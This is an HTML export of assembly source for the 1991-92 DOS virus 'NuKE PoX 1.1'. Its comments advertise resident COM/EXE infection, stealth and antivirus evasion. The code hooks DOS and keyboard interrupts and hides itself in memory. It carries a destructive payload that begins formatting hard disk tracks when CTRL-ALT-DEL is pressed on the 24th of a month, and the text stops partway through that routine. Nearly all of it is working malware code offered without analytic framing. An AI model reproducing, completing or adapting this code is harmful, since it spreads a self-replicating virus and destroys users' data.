<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-</span><span class="sc0">
</span><span class="sc1">;-*      (c) Rock Steady, Viral Developments                             -*</span><span class="sc0">
</span><span class="sc1">;*-      (c) NuKE Software Developement  1991, 1992                      *-</span><span class="sc0">
</span><span class="sc1">;-*  Virus: NuKE PoX Version 1.1  (Alias: Evil Genius, NPox)             -*</span><span class="sc0">
</span><span class="sc1">;*-  ~~~~~~                                                              *-</span><span class="sc0">
</span><span class="sc1">;-*  Notes: Resident EXE &amp; COM Infecting, Memory Stealth, Directory      -*</span><span class="sc0">
</span><span class="sc1">;*-  ~~~~~~ Stealth (FCB Method), Anti-Viral Products Aware, Infects     *-</span><span class="sc0">
</span><span class="sc1">;-*         COMMAND.COM on first Run, CTRL-ALT-DEL Aware...              -*</span><span class="sc0">
</span><span class="sc1">;*-  Bytes: 963 Bytes           Memory: 963 Bytes                        *-</span><span class="sc0">
</span><span class="sc1">;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">
</span><span class="sc5">virus_size</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">last</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">init_virus</span><span class="sc0">                                  
</span><span class="sc5">mut1</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">                                                  
</span><span class="sc5">mut2</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">                                                  
</span><span class="sc5">mut3</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">103h</span><span class="sc0">                                               
</span><span class="sc5">del_code</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">53h</span><span class="sc0">                                                
                                                                           
</span><span class="sc5">seg_a</span><span class="sc0">           </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0">                                        
                </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg_a</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">seg_a</span><span class="sc0">                                 
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">                                               
</span><span class="sc5">rocko</span><span class="sc0">           </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">far</span><span class="sc0">                                                
                                                                           
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">init_virus</span><span class="sc0">                                         
</span><span class="sc1">;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- </span><span class="sc0">
</span><span class="sc1">;                       Virus Begins Here...                               </span><span class="sc0">
</span><span class="sc1">;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- </span><span class="sc0">
</span><span class="sc5">init_virus</span><span class="sc4">:</span><span class="sc0">                                                                
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">doit_now</span><span class="sc0">               </span><span class="sc1">;Doit VirusMan...           </span><span class="sc0">
                                                                           
</span><span class="sc5">doit_now</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                     </span><span class="sc1">;Not to Lose Track          </span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">106h</span><span class="sc0">                </span><span class="sc1">;Set our position           </span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">;Save all the registers     </span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                                                 
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                                                 
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                                                 
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">                                                 
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                                                 
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">                                                 
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                                                 
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                                                 
                                                                           
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7bcdh</span><span class="sc0">               </span><span class="sc1">;Are we resident Already?   </span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7bcdh</span><span class="sc0">               </span><span class="sc1">;Yupe... Quit Then...       </span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exit_com</span><span class="sc0">                                           
                                                                           
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                                              
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                     </span><span class="sc1">;Get CS=DS                  </span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                                                 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                                              
                                                                           
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3509h</span><span class="sc0">               </span><span class="sc1">;Hook Int 9 Please...       </span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int9</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">                        
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int9</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">                          
                                                                           
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">               </span><span class="sc1">;Sometimes tend to intercept</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                    </span><span class="sc1">;This Interrupt...          </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">    </span><span class="sc1">;Save the Int      </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">      </span><span class="sc1">;Vector Table      </span><span class="sc0">
                                                                           
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                     </span><span class="sc1">;Get a new Memory block     </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">;Put it Back to ES          </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">mut1</span><span class="sc0">                                         
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">          </span><span class="sc1">;Size to `Hide'             </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                   </span><span class="sc1">;And all this crap hides    </span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                  </span><span class="sc1">;your number od bytes in DX </span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                                               
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                                              
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                                              
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                                                 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                                              
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc0">                 </span><span class="sc1">;Call int to do it...       </span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                
                                                                           
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_com</span><span class="sc0">                                           
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">                                             
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                                                 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">;It's Done... Yeah!         </span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                
                                                                           
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_com</span><span class="sc0">                                           
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                                                 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                                              
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8h</span><span class="sc0">                  </span><span class="sc1">;Here we move our Virus into</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">mut2</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">             </span><span class="sc1">;the `Hidden' memory!       </span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">                                             
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">mut3</span><span class="sc0">                                            
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                                              
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                                              
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">init_virus</span><span class="sc0">                               
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">                                      
                </span><span class="sc6">cld</span><span class="sc0">                                                        
                </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">movsb</span><span class="sc0">                                              
                                                                           
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">                </span><span class="sc1">;Restore Int21 with ours   </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int21_handler</span><span class="sc0"> </span><span class="sc1">;Where it starts           </span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                                                 
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                
                                                                           
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2509h</span><span class="sc0">               </span><span class="sc1">;Restore Int9 with ours     </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int9_handler</span><span class="sc0"> </span><span class="sc1">;The Handler...             </span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                
                                                                           
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                                                 
</span><span class="sc5">exit_com</span><span class="sc4">:</span><span class="sc0">                                                                  
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">5A4Dh</span><span class="sc0">                     
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exit_exe_file</span><span class="sc0">          </span><span class="sc1">;Its an EXE file...         </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc0">       </span><span class="sc1">;Its a COM file restore     </span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                  </span><span class="sc1">;First three Bytes...       </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;Mov the Byte to AX         </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">100h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">;First two bytes Restored   </span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                   </span><span class="sc1">;Get the next Byte          </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;Move the Byte to AL        </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">102h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">  </span><span class="sc1">;Restore the Last of 3 Bytes</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                     </span><span class="sc1">;Restore Regesters          </span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                                                 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                </span><span class="sc1">;Jump Back to Beginning     </span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">;Restores our IP (a CALL    </span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">                           </span><span class="sc1">;Saves them, now we changed </span><span class="sc0">
</span><span class="sc5">int21</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                      </span><span class="sc1">;Our Old Int21              </span><span class="sc0">
</span><span class="sc5">int9</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                      </span><span class="sc1">;Our Old Int9               </span><span class="sc0">
                                                                           
</span><span class="sc5">exit_exe_file</span><span class="sc4">:</span><span class="sc0">                                                             
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">22</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;Load CS Regester  </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                                              
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                                              
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                                              
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exe_cs</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;Get original CS</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exe_ss</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;Get original SS</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exe_ip</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;Get original IP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">fuck_yeah</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">     </span><span class="sc1">;Restore IP     </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">fuck_yeah</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">;Restore CS     </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exe_sp</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;Get original SP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Rock_Fix1</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">;Restore SS     </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Rock_Fix2</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;Restore SP     </span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                                                 
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0B8h</span><span class="sc0">                   </span><span class="sc1">;This is now a MOV AX,XXXX  </span><span class="sc0">
</span><span class="sc5">Rock_Fix1</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;XXXX is the original SS    </span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;Our XXXX Value             </span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">                            </span><span class="sc1">;Disable Interrupts         </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">;Mov it to SS               </span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0BCh</span><span class="sc0">                   </span><span class="sc1">;This is now a MOV SP,XXXX  </span><span class="sc0">
</span><span class="sc5">Rock_Fix2</span><span class="sc4">:</span><span class="sc0">                                                                 
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;The XXXX Value for SP      </span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">                            </span><span class="sc1">;Enable interrupts          </span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">                   </span><span class="sc1">;JMP XXXX:YYYY              </span><span class="sc0">
</span><span class="sc5">fuck_yeah</span><span class="sc4">:</span><span class="sc0">                                                                 
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;Dword IP:CS (Reverse order!</span><span class="sc0">
</span><span class="sc1">;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- </span><span class="sc0">
</span><span class="sc1">;                       Int 9 Handler                                      </span><span class="sc0">
</span><span class="sc1">;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- </span><span class="sc0">
</span><span class="sc5">int9_handler</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;Every TIME a KEY is pressed</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">;This ROUTINE is called!    </span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">                 </span><span class="sc1">;Has the user attempted a   </span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">del_code</span><span class="sc0">            </span><span class="sc1">;CTRL-ALT-DEL               </span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">warm_reboot</span><span class="sc0">            </span><span class="sc1">;Yes! Screw him             </span><span class="sc0">
</span><span class="sc5">bye_bye</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                                                 
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int9</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;Nope, Leave system alone   </span><span class="sc0">
</span><span class="sc5">warm_reboot</span><span class="sc4">:</span><span class="sc0">                                                               
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ah</span><span class="sc0">                 </span><span class="sc1">;Get Date Please            </span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">                 </span><span class="sc1">;Is it 24th of the Month?   </span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">bye_bye</span><span class="sc0">                </span><span class="sc1">;Yes, bye_Bye HD            </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                                               
</span><span class="sc5">hurt_me</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">                                             
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                                               
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                 </span><span class="sc1">;Formats a few tracks...    </span><span class="sc0">
